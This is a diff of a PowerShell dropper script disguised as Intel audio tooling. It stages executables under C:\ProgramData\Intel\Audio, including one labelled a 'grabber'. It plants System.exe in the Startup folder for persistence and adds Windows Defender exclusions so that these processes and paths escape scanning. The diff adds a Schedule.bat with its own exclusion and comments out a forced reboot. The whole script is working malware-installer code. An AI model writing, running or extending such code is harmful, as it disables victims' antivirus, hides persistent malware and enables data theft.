@@ -1,13 +1,14 @@
 # PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Out-Null"
 
-$TargetPath    = "C:\ProgramData\Intel\Audio"
-$TargetZip     = "$TargetPath\audiotools.zip"
-$TargetFile    = "$TargetPath\AudioTools.exe"
-$TargetGrabber = "$TargetPath\Notify.exe"
-$TargetSystem  = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
-$TargetABat    = "$TargetPath\Register_Audio_Tools.bat"
-$TargetNBat    = "$TargetPath\Register_Notification_Service.bat"
-$TargetSBat    = "$TargetPath\Register_Schedule.bat"
+$TargetPath     = "C:\ProgramData\Intel\Audio"
+$TargetZip      = "$TargetPath\audiotools.zip"
+$TargetFile     = "$TargetPath\AudioTools.exe"
+$TargetGrabber  = "$TargetPath\Notify.exe"
+$TargetSchedule = "$TargetPath\Schedule.bat"
+$TargetSystem   = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
+$TargetSBat     = "$TargetPath\Register_Schedule.bat"
+$TargetABat     = "$TargetPath\Register_AudioTools.bat"
+$TargetNBat     = "$TargetPath\Register_Notify.bat"
 
 Add-MpPreference -ExclusionProcess 'AudioTools.exe' -Force
 Add-MpPreference -ExclusionProcess 'Notify.exe' -Force
@@ -15,6 +16,7 @@ Add-MpPreference -ExclusionProcess 'System.exe' -Force
 Add-MpPreference -ExclusionPath "$TargetPath" -Force
 Add-MpPreference -ExclusionPath "$TargetFile" -Force
 Add-MpPreference -ExclusionPath "$TargetGrabber" -Force
+Add-MpPreference -ExclusionPath "$TargetSchedule" -Force
 Add-MpPreference -ExclusionPath "$TargetSystem" -Force
 
 if (Test-Path "$TargetPath") {
@@ -53,4 +55,4 @@ Remove-Item -Path $TargetPath\Register_AudioTools.bat -Force
 Remove-Item -Path $TargetPath\Register_Notify.bat -Force
 Remove-Item -Path $TargetPath\Register_Schedule.bat -Force
 
-Restart-Computer -Force
+# Restart-Computer -Force
